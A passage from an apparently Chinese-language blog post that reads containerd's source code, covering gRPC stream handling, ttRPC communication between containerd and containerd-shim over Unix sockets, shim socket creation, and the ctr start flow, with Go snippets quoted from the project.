shs { sh.HandleRPC(ctx, statsBegin) } } ctx = NewContextWithServerTransportStream(ctx, stream) 追踪和统计信息：如果启用了 channelz，服务器会增加启动的 RPC 调用计数。然后，如果有配置统计处理器，会记录 RPC 调用的开始时间和其他元数据。 上下文初始化：通过 NewContextWithServerTransportStream 函数将流对象加入到上下文中，便于后续处理。 初始化 serverStream 对象\n1 2 3 4 5 6 7 8 9 10 11 ss := \u0026amp;serverStream{ ctx: ctx, t: t, s: stream, p: \u0026amp;parser{r: stream, recvBufferPool: s.opts.recvBufferPool}, codec: s.getCodec(stream.ContentSubtype()), maxReceiveMessageSize: s.opts.maxReceiveMessageSize, maxSendMessageSize: s.opts.maxSendMessageSize, trInfo: trInfo, statsHandler: shs, } 创建 serverStream：serverStream 是 gRPC-Go 用于处理流式 RPC 请求的核心对象。它包含了与当前流相关的所有信息，如上下文、传输层、编解码器等。 处理压缩和解压缩逻辑\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 if rc := stream.RecvCompress(); s.opts.dc != nil \u0026amp;\u0026amp; s.opts.dc.Type() == rc { ss.dc = s.opts.dc } else if rc != \u0026#34;\u0026#34; \u0026amp;\u0026amp; rc != encoding.Identity { ss.decomp = encoding.GetCompressor(rc) if ss.decomp == nil { st := status.Newf(codes.Unimplemented, \u0026#34;grpc: Decompressor is not installed for grpc-encoding %q\u0026#34;, rc) t.WriteStatus(ss.s, st) return st.Err() } } if s.opts.cp != nil { ss.cp = s.opts.cp ss.sendCompressorName = s.opts.cp.Type() } else if rc := stream.RecvCompress(); rc != \u0026#34;\u0026#34; \u0026amp;\u0026amp; rc != encoding.Identity { ss.comp = encoding.GetCompressor(rc) if ss.comp != nil { ss.sendCompressorName = rc } } 解压缩设置：检查客户端请求中使用的压缩方法，如果服务器端配置了对应的解压缩器，则设置在 serverStream 对象中。如果找不到对应的解压缩器，则返回 Unimplemented 错误。 压缩设置：如果服务器配置了压缩器，或者客户端请求中指定了压缩方法，服务器会尝试使用相同的压缩方法响应。 调用实际的 RPC 处理器\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 var appErr error var server any if info != nil { server = info.serviceImpl } if s.opts.streamInt == nil { appErr = sd.Handler(server, ss) } else { info := \u0026amp;StreamServerInfo{ FullMethod: stream.Method(), IsClientStream: sd.ClientStreams, IsServerStream: sd.ServerStreams, } appErr = s.opts.streamInt(server, ss, info, sd.Handler) } 实际调用：这里根据是否配置了拦截器（streamInt）来决定如何调用实际的 RPC 处理器（Handler）。如果有拦截器，处理器会被拦截器包装；否则直接调用处理器。 Handler 函数：Handler 是用户定义的处理流式 RPC 请求的函数，它会在服务器端处理从客户端接收到的数据流，并根据逻辑生成响应。 处理 RPC 调用后的清理和日志记录\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 if appErr != nil { appStatus, ok := status.FromError(appErr) if !ok { appStatus = status.FromContextError(appErr) appErr = appStatus.Err() } if trInfo != nil { ss.mu.Lock() ss.trInfo.tr.LazyLog(stringer(appStatus.Message()), true) ss.trInfo.tr.SetError() ss.mu.Unlock() } if len(ss.binlogs) != 0 { st := \u0026amp;binarylog.ServerTrailer{ Trailer: ss.s.Trailer(), Err: appErr, } for _, binlog := range ss.binlogs { binlog.Log(ctx, st) } } t.WriteStatus(ss.s, appStatus) return appErr } if trInfo != nil { ss.mu.Lock() ss.trInfo.tr.LazyLog(stringer(\u0026#34;OK\u0026#34;), false) ss.mu.Unlock() } if len(ss.binlogs) != 0 { st := \u0026amp;binarylog.ServerTrailer{ Trailer: ss.s.Trailer(), Err: appErr, } for _, binlog := range ss.binlogs { binlog.Log(ctx, st) } } return t.WriteStatus(ss.s, statusOK) 错误处理：如果处理过程中发生错误，函数会将错误转换为 gRPC 状态码并返回给客户端。 日志和追踪：记录处理过程中的日志和追踪信息（如错误信息、响应状态等），确保在调试或监控时有充分的上下文。 返回状态：函数最后会通过 WriteStatus 将处理结果的状态码写回客户端。 接着分析sd.Handler 的来源\n在 gRPC 中，服务和方法的定义通常是在 .proto 文件中定义的，之后通过 gRPC 编译器生成相应的 Go 代码。在生成的代码中，每个服务方法都会有一个对应的 Handler 函数。这个 Handler 函数会在服务注册时被传递给 gRPC 服务器。（所以containerd中的服务都是通过handler来处理的，而非每个服务都是一个单独的进程，同时这里与前面形成了闭环，在containerd的启动中有涉及到服务注册）\nsd 对象：sd 是 *StreamDesc 类型的对象，描述了流式 RPC 方法的特性，包括是否是客户端流、是否是服务器端流，以及处理该 RPC 调用的 Handler 函数。 Handler 字段：sd.Handler 是一个函数类型，用于处理特定的流式 RPC 请求。这个函数是用户在服务注册时提供的，用于执行实际的业务逻辑。 Containerd与Containerd-shim通信机制 containerd-shim 和 containerd 之间的通信是容器运行时的核心部分，确保容器的创建、管理和删除等操作能够顺利进行。它们之间的通信主要通过以下方式进行：\nttRPC containerd 和 containerd-shim 之间的通信主要通过一种称为 ttRPC 的轻量级 RPC 框架进行。ttRPC 是 containerd 项目中引入的，专门设计用于高效的进程间通信（IPC），特别是在同一主机上运行的进程之间。\nttRPC: ttRPC 是 containerd 团队开发的一种优化后的 RPC 框架，旨在提供比 gRPC 更低的延迟和更小的开销。它直接通过 Unix 域套接字进行通信，没有 HTTP/2 的开销。 containerd 使用 ttRPC 来向 containerd-shim 发送控制命令，如启动、停止、挂起和删除容器。 在containerd中是这样启动的\n1 2 3 4 5 tl, err := sys.GetLocalListener(config.TTRPC.Address, config.TTRPC.UID, config.TTRPC.GID) if err != nil { return fmt.Errorf(\u0026#34;failed to get listener for main ttrpc endpoint: %w\u0026#34;, err) } serve(ctx, tl, server.ServeTTRPC) Unix 域套接字 containerd 和 containerd-shim 之间的通信通常通过 Unix 域套接字进行。这种通信方式非常适合同一主机上的进程间通信，具有低延迟和高效的特点。\nUnix 域套接字: 在启动时，containerd-shim 进程会通过一个专用的 Unix 域套接字与 containerd 建立通信。 这个套接字通常位于 /run/containerd/ 或 /run/containerd/io.containerd.runtime.v2.linux/ 目录下，并带有容器 ID 相关的命名。 容器生命周期管理 containerd 通过 ttRPC 和 Unix 域套接字与 containerd-shim 进行通信，以管理容器的生命周期：\n容器创建: 当 containerd 收到创建容器的请求时，它会启动一个新的 containerd-shim 进程。这个进程负责在 runc 或其他 OCI 兼容的运行时上运行容器。 容器管理: containerd-shim 进程负责处理容器的标准输入/输出流、信号管理以及其他与容器相关的操作。containerd 通过 ttRPC 向 containerd-shim 发送命令（如启动、停止容器）。 容器删除: 当容器退出时，containerd-shim 进程将继续运行，直到 containerd 通过 ttRPC 命令告知 containerd-shim 进程可以安全退出。这确保了即使 containerd 崩溃，容器进程也不会被终止。 容器与守护进程的分离 containerd-shim 的存在还使得容器与 containerd 守护进程分离。这意味着：\n独立性: 即使 containerd 守护进程崩溃或重启，已经运行的容器仍然能够继续运行，因为它们由独立的 containerd-shim 进程管理。 减少依赖: 这种架构减少了对单点故障的依赖，增强了容器运行的稳定性。 Containerd-shim与Container通信机制 通信流程 containerd 通过一个runtime来实现对多个容器的控制，例如 create、start 和 stop。\n通信流程如下：\n来自 containerd 的创建容器的客户端请求 containerd 设置容器的文件系统，并创建必要的配置信息 containerd 调用 shim，包括容器配置，这个容器配置决定是启动新的套接字侦听器（shim与container 1：1）还是使用现有的套接字侦听器（1：多） 如果使用现有套接字，则返回现有 socket 的地址并退出 如果是使用新的套接字，则shim a. 创建一个新进程来侦听套接字中来自 containerd 的 ttRPC 命令 b. 将该套接字的地址返回给 containerd c. 退出 containerd 向 shim 发送一个命令来启动容器 containerd 通过 API 调用runtime来创建/启动/停止容器 但是，containerd 本身实际上并不直接调用运行时来启动容器。相反，它期望调用运行时，这将暴露一个套接字 ， 在类 Unix 系统上是 Unix 域，在 Windows 上名为 pipe， 并通过该套接字上的 ttRPC 侦听容器命令。\n运行时有两种常见的模式：\n一个用于运行时的二进制文件，它既侦听套接字又创建/启动/停止容器 一个分离的 Shim 二进制文件，用于侦听套接字，并调用一个单独的运行时引擎来创建/启动/停止容器 使用单独的“shim + engine”模式是因为它可以更轻松地集成实现特定运行时引擎规范（如 OCI 运行时规范）的不同运行时。ttRPC 协议可以通过一个runtime shim进行处理，而可以使用不同的运行时引擎实现，只要它们实现 OCI 运行时规范即可。\n最常用的运行时引擎是 runc，它实施 OCI 运行时规范。由于这是一个运行时引擎，因此 containerd 不会直接调用它;相反，它由 Shim 调用，该 Shim 侦听套接字并调用运行时引擎。\n以下序列图显示了执行 ctr run 命令时的操作流程。\n源码解析 shim启动入口：containerd/cmd/containerd-shim-runc-v2/main.go\n1 2 3 func main() { shim.Run(context.Background(a), manager.NewShimManager(\u0026#34;io.containerd.runc.v2\u0026#34;)) } Run函数：containerd/pkg/shim/shim.go\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 // Run initializes and runs a shim server. func Run(ctx context.Context, manager Manager, opts ...BinaryOpts) { var config Config for _, o := range opts { o(\u0026amp;config) } ctx = log.WithLogger(ctx, log.G(ctx).WithField(\u0026#34;runtime\u0026#34;, manager.Name())) if err := run(ctx, manager, config); err != nil { fmt.Fprintf(os.Stderr, \u0026#34;%s: %s\u0026#34;, manager.Name(), err) os.Exit(1) } } shim真正启动：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 //shim 启动 func run(ctx context.Context, manager Manager, config Config) error { //... setRuntime() //... // Handle explicit actions switch action { case \u0026#34;delete\u0026#34;: //... case \u0026#34;start\u0026#34;: opts := StartOpts{ Address: addressFlag, TTRPCAddress: ttrpcAddress, Debug: debugFlag, } // 第一个启动的shim接收的action 就是 start。这里启动第二个shim。address是根据ns和id哈希出来的，会传递给第二个shim,第二个shim会以这个地址起一个server，同时会通过stdout发送给containerd（因为c启动的本进程，所以可以收到），这就是containerd和第二个shim交流的.sock地址。 params, err := manager.Start(ctx, id, opts) if err != nil { return err } data, err := json.Marshal(\u0026amp;params) if err != nil { return fmt.Errorf(\u0026#34;failed to marshal bootstrap params to json: %w\u0026#34;, err) } if _, err := os.Stdout.Write(data); err != nil { return err } return nil } //... unaryInterceptor := chainUnaryServerInterceptors(ttrpcUnaryInterceptors...) server, err := newServer(ttrpc.WithUnaryServerInterceptor(unaryInterceptor)) if err != nil { return fmt.Errorf(\u0026#34;failed creating server: %w\u0026#34;, err) } for _, srv := range ttrpcServices { if err := srv.RegisterTTRPC(server); err != nil { return fmt.Errorf(\u0026#34;failed to register service: %w\u0026#34;, err) } } if err := serve(ctx, server, signals, sd.Shutdown); err != nil { if !errors.Is(err, shutdown.ErrShutdown) { cleanupSockets(ctx) return err } } //... } 启动第二个shim：\n这里有一个有意思地方是第二个shim如何获取自身作为server的socket地址。从代码上看是通过把套接字转换成文件描述符传递给第二个shim，然后第二个shim再还原成listener实现的。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 func (manager) Start(ctx context.Context, id string, opts shim.StartOpts) (_ shim.BootstrapParams, retErr error) { var params shim.BootstrapParams params.Version = 3 params.Protocol = \u0026#34;ttrpc\u0026#34; cmd, err := newCommand(ctx, id, opts.Address, opts.TTRPCAddress, opts.Debug) if err != nil { return params, err } grouping := id spec, err := readSpec() //... var sockets []*shimSocket s, err := newShimSocket(ctx, opts.Address, grouping, false) if err != nil { if errdefs.IsAlreadyExists(err) { params.Address = s.addr return params, nil } return params, err } sockets = append(sockets, s) cmd.ExtraFiles = append(cmd.ExtraFiles, s.f) goruntime.LockOSThread() if os.Getenv(\u0026#34;SCHED_CORE\u0026#34;) != \u0026#34;\u0026#34; { if err := schedcore.Create(schedcore.ProcessGroup); err != nil { return params, fmt.Errorf(\u0026#34;enable sched core support: %w\u0026#34;, err) } } if err := cmd.Start(); err != nil { return params, err } goruntime.UnlockOSThread() // 启动成功后，第一个 shim 退出，执行清理操作 defer func() { if retErr != nil { cmd.Process.Kill() } }() // make sure to wait after start go cmd.Wait() //... params.Address = sockets[0].addr return params, nil } shim socket套接字创建：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 //shim socket创建 func newShimSocket(ctx context.Context, path, id string, debug bool) (*shimSocket, error) { address, err := shim.SocketAddress(ctx, path, id, debug) socket, err := shim.NewSocket(address) //... s := \u0026amp;shimSocket{ addr: address, s: socket, } f, err := socket.File() if err != nil { s.Close() return nil, err } s.f = f return s, nil } SocketAddress：生成一个唯一的位于/run/containerd/s/\u0026lt;哈希值\u0026gt;下的Unix 套接字地址\n1 2 3 4 5 6 7 8 9 10 11 12 13 // SocketAddress returns a socket address func SocketAddress(ctx context.Context, socketPath, id string, debug bool) (string, error) { ns, err := namespaces.NamespaceRequired(ctx) if err != nil { return \u0026#34;\u0026#34;, err } path := filepath.Join(socketPath, ns, id) if debug { path = filepath.Join(path, \u0026#34;debug\u0026#34;) } d := sha256.Sum256([]byte(path)) return fmt.Sprintf(\u0026#34;unix://%s/%x\u0026#34;, filepath.Join(socketRoot, \u0026#34;s\u0026#34;), d), nil } NewSocket：设置sock文件权限\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 //真正的socket创建 // NewSocket returns a new socket func NewSocket(address string) (*net.UnixListener, error) { var ( sock = socket(address) path = sock.path() isAbstract = sock.isAbstract() perm = os.FileMode(0600) ) // Darwin needs +x to access socket, otherwise it\u0026#39;ll fail with \u0026#34;bind: permission denied\u0026#34; when running as non-root. if runtime.GOOS == \u0026#34;darwin\u0026#34; { perm = 0700 } if !isAbstract { if err := os.MkdirAll(filepath.Dir(path), perm); err != nil { return nil, fmt.Errorf(\u0026#34;mkdir failed for %s: %w\u0026#34;, path, err) } } l, err := net.Listen(\u0026#34;unix\u0026#34;, path) if err != nil { return nil, err } if !isAbstract { if err := os.Chmod(path, perm); err != nil { os.Remove(sock.path()) l.Close() return nil, fmt.Errorf(\u0026#34;chmod failed for %s: %w\u0026#34;, path, err) } } return l.(*net.UnixListener), nil } serve函数，启动 ttrpc 服务，并提供RPC服务：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 // serve serves the ttrpc API over a unix socket in the current working directory // and blocks until the context is canceled func serve(ctx context.Context, server *ttrpc.Server, signals chan os.Signal, shutdown func()) error { dump := make(chan os.Signal, 32) setupDumpStacks(dump) path, err := os.Getwd() if err != nil { return err } //创建 Unix 套接字监听器 l, err := serveListener(socketFlag, 3) if err != nil { return err } // 启动 ttrpc 服务器 go func() { defer l.Close() if err := server.Serve(ctx, l); err != nil \u0026amp;\u0026amp; !errors.Is(err, net.ErrClosed) { log.G(ctx).WithError(err).Fatal(\u0026#34;containerd-shim: ttrpc server failure\u0026#34;) } }() //... go handleExitSignals(ctx, logger, shutdown) return reap(ctx, logger, signals) } 创建一个用于监听 Unix 套接字的 net.Listener\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 // serve()会最终调用这个函数来启动服务监听 func serveListener(path string, fd uintptr) (net.Listener, error) { //创建监听器的逻辑 var ( l net.Listener err error ) //处理继承的文件描述符 if path == \u0026#34;\u0026#34; { //os.NewFile(fd, \u0026#34;socket\u0026#34;) 将文件描述符 fd 封装成 //一个*os.File 对象，并使用 net.FileListener 将其 //转换为 net.Listener，这样可以通过套接字进行通信。 l, err = net.FileListener(os.NewFile(fd, \u0026#34;socket\u0026#34;)) path = \u0026#34;[inherited from parent]\u0026#34; } else { //创建新的 Unix 套接字 if len(path) \u0026gt; socketPathLimit { return nil, fmt.Errorf(\u0026#34;%q: unix socket path too long (\u0026gt; %d)\u0026#34;, path, socketPathLimit) } l, err = net.Listen(\u0026#34;unix\u0026#34;, path) } if err != nil { return nil, err } log.L.WithField(\u0026#34;socket\u0026#34;, path).Debug(\u0026#34;serving api on socket\u0026#34;)· return l, nil } 回到serve函数，containerd-shim以注册服务的形式来对containerd提供容器相关操作，下面是相关服务注册的源码，可以看到shim通过调用runc容器运行时来创建容器。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 func (s *service) RegisterTTRPC(server *ttrpc.Server) error { taskAPI.RegisterTTRPCTaskService(server, s) return nil } // Create a new initial process and container with the underlying OCI runtime func (s *service) Create(ctx context.Context, r *taskAPI.CreateTaskRequest) (_ *taskAPI.CreateTaskResponse, err error) { s.mu.Lock() defer s.mu.Unlock() s.lifecycleMu.Lock() handleStarted, cleanup := s.preStart(nil) s.lifecycleMu.Unlock() defer cleanup() container, err := runc.NewContainer(ctx, s.platform, r) if err != nil { return nil, err } s.containers[r.ID] = container s.send(\u0026amp;eventstypes.TaskCreate{ ContainerID: r.ID, Bundle: r.Bundle, Rootfs: r.Rootfs, IO: \u0026amp;eventstypes.TaskIO{ Stdin: r.Stdin, Stdout: r.Stdout, Stderr: r.Stderr, Terminal: r.Terminal, }, Checkpoint: r.Checkpoint, Pid: uint32(container.Pid()), }) // The following line cannot return an error as the only state in which that // could happen would also cause the container.Pid() call above to // nil-deference panic. proc, _ := container.Process(\u0026#34;\u0026#34;) handleStarted(container, proc) return \u0026amp;taskAPI.CreateTaskResponse{ Pid: uint32(container.Pid()), }, nil } 注：shim创建的与containerd通信的sock文件的mode为0600，实际情况与源码一致。\n容器启动流程分析 分析流程图如下，task.Start没有往下分析，它的函数传递流程与Newtask类似。\nctr解析命令\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 //调用command.NewClient()-\u0026gt;client.LoadContainer()-\u0026gt;NewTask()-\u0026gt;task.Start() /* 1、command.NewClient() 创建containerd client 2、LoadContainer() 3、NewTask() 4、task.Start() //如果收到退出信号 5、task.Delete(ctx) */ var startCommand = \u0026amp;cli.Command{ Name: \u0026#34;start\u0026#34;, Usage: \u0026#34;Start a container that has been created\u0026#34;, ArgsUsage: \u0026#34;CONTAINER\u0026#34;, Flags: append(platformStartFlags, []cli.Flag{ \u0026amp;cli.BoolFlag{ Name: \u0026#34;null-io\u0026#34;, Usage: \u0026#34;Send all IO to /dev/null\u0026#34;, }, \u0026amp;cli.StringFlag{ Name: \u0026#34;log-uri\u0026#34;, Usage: \u0026#34;Log uri\u0026#34;, }, \u0026amp;cli.StringFlag{ Name: \u0026#34;fifo-dir\u0026#34;, Usage: \u0026#34;Directory used for storing IO FIFOs\u0026#34;, }, \u0026amp;cli.StringFlag{ Name: \u0026#34;pid-file\u0026#34;, Usage: \u0026#34;File path to write the task\u0026#39;s pid\u0026#34;, }, \u0026amp;cli.BoolFlag{ Name: \u0026#34;detach\u0026#34;, Aliases: []string{\u0026#34;d\u0026#34;}, Usage: \u0026#34;Detach from the task after it has started execution\u0026#34;, }, }...), Action: func(cliContext *cli.Context) error { var ( err error id = cliContext.Args().Get(0) detach = cliContext.Bool(\u0026#34;detach\u0026#34;) ) if id == \u0026#34;\u0026#34; { return errors.New(\u0026#34;container id must be provided\u0026#34;) } client, ctx, cancel, err := commands.NewClient(cliContext) container, err := client.LoadContainer(ctx, id) spec, err := container.Spec(ctx) var ( tty = spec.Process.Terminal opts = GetNewTaskOpts(cliContext) ioOpts = []cio.Opt{cio.WithFIFODir(cliContext.String(\u0026#34;fifo-dir\u0026#34;))} ) var con console.Console if tty { con = console.Current() defer con.Reset() if err := con.SetRaw(); err != nil { return err } } task, err := NewTask(ctx, client, container, \u0026#34;\u0026#34;, con, cliContext.Bool(\u0026#34;null-io\u0026#34;), cliContext.String(\u0026#34;log-uri\u0026#34;), ioOpts, opts...) //... if err := task.Start(ctx); err != nil { return err } if tty { if err := HandleConsoleResize(ctx, task, con); err != nil { log.L.WithError(err).Error(\u0026#34;console resize\u0026#34;) } } else { sigc := commands.ForwardAllSignals(ctx, task) defer commands.StopCatch(sigc) } status := \u0026lt;-statusC code, _, err := status.Result() if err != nil { return err } if _, err := task.Delete(ctx); err != nil { return err } if code != 0 { return cli.Exit(\u0026#34;\u0026#34;, int(code)) } return nil }, } 1、containerd client创建\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 // containerd\\containerd\\cmd\\ctr\\commands\\client.go // NewClient returns a new containerd client func NewClient(cliContext *cli.Context, opts ...containerd.Opt) (*containerd.Client, context.Context, context.CancelFunc, error) { timeoutOpt := containerd.WithTimeout(cliContext.Duration(\u0026#34;connect-timeout\u0026#34;)) opts = append(opts, timeoutOpt) client, err := containerd.New(cliContext.String(\u0026#34;address\u0026#34;), opts...) if err != nil { return nil, nil, nil, err } ctx, cancel := AppContext(cliContext) var suppressDeprecationWarnings bool if !suppressDeprecationWarnings { resp, err := client.IntrospectionService().Server(ctx) if err != nil { log.L.WithError(err).Warn(\u0026#34;Failed to check deprecations\u0026#34;) } else { for _, d := range resp.Deprecations { log.L.Warn(\u0026#34;DEPRECATION: \u0026#34; + d.Message) } } } return client, ctx, cancel, nil } 1、实际调用New函数创建\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 // containerd\\containerd\\client\\client.go // New returns a new containerd client that is connected to the containerd // instance provided by address func New(address string, opts ...Opt) (*Client, error) { var copts clientOpts for _, o := range opts { if err := o(\u0026amp;copts); err != nil { return nil, err } } if copts.timeout == 0 { copts.timeout = 10 * time.Second } c := \u0026amp;Client{ defaultns: copts.defaultns, } if copts.defaultRuntime != \u0026#34;\u0026#34; { c.runtime = copts.defaultRuntime } else { c.runtime = defaults.DefaultRuntime } if copts.defaultPlatform != nil { c.platform = copts.defaultPlatform } else { c.platform = platforms.Default() } if copts.services != nil { c.services = *copts.services } if address != \u0026#34;\u0026#34; { backoffConfig := backoff.DefaultConfig backoffConfig.MaxDelay = copts.timeout connParams := grpc.ConnectParams{ Backoff: backoffConfig, } gopts := []grpc.DialOption{ grpc.WithTransportCredentials(insecure.NewCredentials()), grpc.WithConnectParams(connParams), grpc.WithContextDialer(dialer.ContextDialer), } if len(copts.dialOptions) \u0026gt; 0 { gopts = copts.dialOptions } gopts = append(gopts, grpc.WithDefaultCallOptions( grpc.MaxCallRecvMsgSize(defaults.DefaultMaxRecvMsgSize), grpc.MaxCallSendMsgSize(defaults.DefaultMaxSendMsgSize))) if len(copts.callOptions) \u0026gt; 0 { gopts = append(gopts, grpc.WithDefaultCallOptions(copts.callOptions...)) } if copts.defaultns != \u0026#34;\u0026#34; { unary, stream := newNSInterceptors(copts.defaultns) gopts = append(gopts, grpc.WithChainUnaryInterceptor(unary)) gopts = append(gopts, grpc.WithChainStreamInterceptor(stream)) } connector := func() (*grpc.ClientConn, error) { conn, err := grpc.NewClient(dialer.DialAddress(address), gopts...) if err != nil { return nil, fmt.Errorf(\u0026#34;failed to dial %q: %w\u0026#34;, address, err) } return conn, nil } conn, err := connector() if err != nil { return nil, err } c.conn, c.connector = conn, connector } if copts.services == nil \u0026amp;\u0026amp; c.conn == nil { return nil, fmt.Errorf(\u0026#34;no grpc connection or services is available: %w\u0026#34;, errdefs.ErrUnavailable) } // check namespace labels for default runtime if copts.defaultRuntime == \u0026#34;\u0026#34; \u0026amp;\u0026amp; c.defaultns != \u0026#34;\u0026#34; { if label, err := c.GetLabel(context.Background(), defaults.DefaultRuntimeNSLabel); err != nil { return nil, err } else if label != \u0026#34;\u0026#34; { c.runtime = label } } return c, nil } 2、加载container\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // containerd\\containerd\\client\\client.go // LoadContainer loads an existing container from metadata func (c *Client) LoadContainer(ctx context.Context, id string) (Container, error) { ctx, span := tracing.StartSpan(ctx, \u0026#34;client.LoadContainer\u0026#34;) defer span.End() r, err := c.ContainerService().Get(ctx, id) if err != nil { return nil, err } span.SetAttributes( tracing.Attribute(\u0026#34;container.id\u0026#34;, r.ID), tracing.Attribute(\u0026#34;container.image.ref\u0026#34;, r.Image), tracing.Attribute(\u0026#34;container.runtime.name\u0026#34;, r.Runtime.Name), tracing.Attribute(\u0026#34;container.snapshotter.name\u0026#34;, r.Snapshotter), tracing.Attribute(\u0026#34;container.createdAt\u0026#34;, r.CreatedAt.Format(time.RFC3339)), tracing.Attribute(\u0026#34;container.updatedAt\u0026#34;, r.UpdatedAt.Format(time.RFC3339)), ) return containerFromRecord(c, r), nil } 2、ContainerService实际是调用的NewRemoteContainerStore，返回NewContainersClient\n1 2 3 4 5 6 7 8 9 // ContainerService returns the underlying container Store func (c *Client) ContainerService() containers.Store { if c.containerStore != nil { return c.containerStore } c.connMu.Lock() defer c.connMu.Unlock() return NewRemoteContainerStore(containersapi.NewContainersClient(c.conn)) } 2、gRPC调用containerd的containers.Get函数\ncontainerd/containerd/api/services/containers/v1/containers_grpc.pb.go\n1 2 3 4 5 6 7 8 func (c *containersClient) Get(ctx context.Context, in *GetContainerRequest, opts ...grpc.CallOption) (*GetContainerResponse, error) { out := new(GetContainerResponse) err := c.cc.Invoke(ctx, \u0026#34;/containerd.services.containers.v1.Containers/Get\u0026#34;, in, out, opts...) if err != nil { return nil, err } return out, nil } 2、containerd接收并处理请求\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // containerd/containerd/api/services/containers/v1/containers_grpc.pb.go func _Containers_Get_Handler(srv interface{}, ctx context.Context, dec func(interface{}) error, interceptor grpc.UnaryServerInterceptor) (interface{}, error) { in := new(GetContainerRequest) if err := dec(in); err != nil { return nil, err } if interceptor == nil { return srv.(ContainersServer).Get(ctx, in) } info := \u0026amp;grpc.UnaryServerInfo{ Server: srv, FullMethod: \u0026#34;/containerd.services.containers.v1.Containers/Get\u0026#34;, } handler := func(ctx context.Context, req interface{}) (interface{}, error) { return srv.(ContainersServer).Get(ctx, req.(*GetContainerRequest)) } return interceptor(ctx, in, info, handler) } 2、接着调用local.Get()函数处理（这里有个对象的转换ContainersServer转换到Service再转换到local）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 // containerd/containerd/api/services/containers/v1/containers_grpc.pb.go // 这里调用底层的数据库获取contianer func (l *local) Get(ctx context.Context, req *api.GetContainerRequest, _ ...grpc.CallOption) (*api.GetContainerResponse, error) { var resp api.GetContainerResponse return \u0026amp;resp, errdefs.ToGRPC(l.withStoreView(ctx, func(ctx context.Context) error { container, err := l.Store.Get(ctx, req.ID) if err != nil { return err } containerpb := containerToProto(\u0026amp;container) resp.Container = containerpb return nil })) } 3、NewTask创建容器请求\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 // containerd\\containerd\\cmd\\ctr\\commands\\tasks\\tasks_unix.go //NewTask creates a new task func NewTask(ctx context.Context, client *containerd.Client, container containerd.Container, checkpoint string, con console.Console, nullIO bool, logURI string, ioOpts []cio.Opt, opts ...containerd.NewTaskOpts) (containerd.Task, error) { stdinC := \u0026amp;stdinCloser{ stdin: os.Stdin, } if checkpoint != \u0026#34;\u0026#34; { im, err := client.GetImage(ctx, checkpoint) if err != nil { return nil, err } opts = append(opts, containerd.WithTaskCheckpoint(im)) } spec, err := container.Spec(ctx) if err != nil { return nil, err } if spec.Linux != nil { if len(spec.Linux.UIDMappings) != 0 { opts = append(opts, containerd.WithUIDOwner(spec.Linux.UIDMappings[0].HostID)) } if len(spec.Linux.GIDMappings) != 0 { opts = append(opts, containerd.WithGIDOwner(spec.Linux.GIDMappings[0].HostID)) } } var ioCreator cio.Creator if con != nil { if nullIO { return nil, errors.New(\u0026#34;tty and null-io cannot be used together\u0026#34;) } ioCreator = cio.NewCreator(append([]cio.Opt{cio.WithStreams(con, con, nil), cio.WithTerminal}, ioOpts...)...) } else if nullIO { ioCreator = cio.NullIO } else if logURI != \u0026#34;\u0026#34; { u, err := url.Parse(logURI) if err != nil { return nil, err } ioCreator = cio.LogURI(u) } else { ioCreator = cio.NewCreator(append([]cio.Opt{cio.WithStreams(stdinC, os.Stdout, os.Stderr)}, ioOpts...)...) } t, err := container.NewTask(ctx, ioCreator, opts...) if err != nil { return nil, err } stdinC.closer = func() { t.CloseIO(ctx, containerd.WithStdinCloser) } return t, nil } 3、调用container.NewTask函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 //containerd\\containerd\\client\\container.go func (c *container) NewTask(ctx context.Context, ioCreate cio.Creator, opts ...NewTaskOpts) (_ Task, err error) { ctx, span := 